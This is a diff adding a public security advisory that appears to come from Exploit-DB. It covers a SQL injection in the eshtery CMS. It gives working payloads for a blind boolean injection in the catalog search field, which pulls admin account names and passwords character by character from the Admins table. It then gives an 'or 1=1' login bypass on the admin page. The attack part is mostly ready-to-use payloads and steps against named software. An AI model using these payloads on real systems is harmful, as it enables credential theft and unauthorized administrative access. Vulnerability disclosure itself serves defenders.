@@ -1,0 +1,78 @@
+'''
+  __  __  ____         _    _ ____  
+ |  \/  |/ __ \   /\  | |  | |  _ \ 
+ | \  / | |  | | /  \ | |  | | |_) |
+ | |\/| | |  | |/ /\ \| |  | |  _ < 
+ | |  | | |__| / ____ \ |__| | |_) |
+ |_|  |_|\____/_/    \_\____/|____/ 
+
+http://www.exploit-db.com/moaub12-eshtery-cms-sql-injection-vulnerability/
+'''
+
+
+Abysssec Inc Public Advisory
+ 
+  Title            :  eshtery CMS Sql Injection Vulnerability
+  Affected Version :  eshtery copyrights 2003-2004
+  Discovery        :  www.abysssec.com
+  Vendor	   :  http://eshtery.she7ata.com/projects/eshtery/
+
+  Demo  	   :  http://eshtery.she7ata.com/projects/eshtery/
+  Download Links   :  http://sourceforge.net/projects/eshtery/
+  
+ 
+Description :
+===========================================================================================      
+1) SQL Injection
+
+  for successful injection in this cms you have to pass two steps.
+      
+   Step 1:
+   ----------------------------------------------------------------------------------------
+          Go to this path:
+                 http://Example.com/catlgsearch.aspx
+
+          and enter this value in Criteria field:
+                 %') and 1=1 AND (Item.iname LIKE '%
+    
+          and click on "go" button. You will see that the data will be loaded.
+          
+          Now enter this value:
+                 %') and 1=2 AND (Item.iname LIKE '%
+           
+          With this value no data will be loaded.
+
+
+          So if we enter below value, with the following technique we can define the first character 
+          of AccName field of Admins table :
+                 %') and 1=IIF((select mid(last(AccName),1,1) from (select top 1 AccName from admins))='a',1,2) AND (Item.iname LIKE '% 
+
+          If the first character is 'a', the data will be loaded. If not, you will see nothing.
+          
+          Second character:
+                 %') and 1=IIF((select mid(last(AccName),2,1) from (select top 1 AccName from admins))='d',1,2) AND (Item.iname LIKE '% 
+
+          and respectivly you can acqure another characters.
+
+          As a result, the first value of AccName field from Admins table acqured.  
+
+          With this method you can obtain the Password value of Admin from Admins table
+          and going to other steps is not  necessary.
+
+
+    Step 2:
+   ----------------------------------------------------------------------------------------          
+          The value of AccName obtained in the first step(for example: admin).
+          You can go to adminlogin.aspx page:
+                 http://Example.com/adminlogin.aspx 
+
+          and enter this value to login: 
+                 username : admin' or '1'='1 
+        	 password : foo
+  
+          Now you are admin of site.
+
+  
+          
+
+===========================================================================================
